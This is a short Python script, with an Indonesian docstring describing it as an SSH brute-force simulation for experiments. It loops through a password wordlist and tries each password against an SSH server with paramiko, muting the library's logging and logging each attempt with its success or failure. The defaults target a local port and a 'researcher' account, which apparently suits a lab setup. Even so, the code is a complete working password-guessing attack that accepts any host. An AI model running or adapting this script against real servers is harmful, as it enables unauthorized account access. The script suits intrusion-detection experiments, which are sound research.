#!/usr/bin/env python3
"""Simulasi brute force SSH sederhana untuk kebutuhan eksperimen."""

import argparse
import logging
import warnings
import time
from pathlib import Path

from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import paramiko

for logger_name in ["paramiko", "paramiko.transport", "paramiko.auth_handler"]:
    logging.getLogger(logger_name).setLevel(logging.CRITICAL)


def attempt_ssh(host: str, port: int, username: str, password: str, timeout: int = 3) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        client.close()
        return True
    except Exception:
        try:
            client.close()
        except Exception:
            pass
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--username", default="researcher")
    parser.add_argument("--wordlist", default="scripts/wordlists/ssh_passwords.txt")
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--attempts", type=int, default=60)
    parser.add_argument("--output", default="results/attack_ssh.log")
    args = parser.parse_args()

    passwords = [p.strip() for p in Path(args.wordlist).read_text(encoding="utf-8").splitlines() if p.strip()]
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)

    with out.open("a", encoding="utf-8") as f:
        for idx in range(args.attempts):
            password = passwords[idx % len(passwords)]
            ok = attempt_ssh(args.host, args.port, args.username, password)
            status = "SUCCESS" if ok else "FAIL"
            line = f"attempt={idx + 1} user={args.username} pass={password} status={status}\n"
            f.write(line)
            print(line, end="")
            time.sleep(args.delay)


if __name__ == "__main__":
    main()
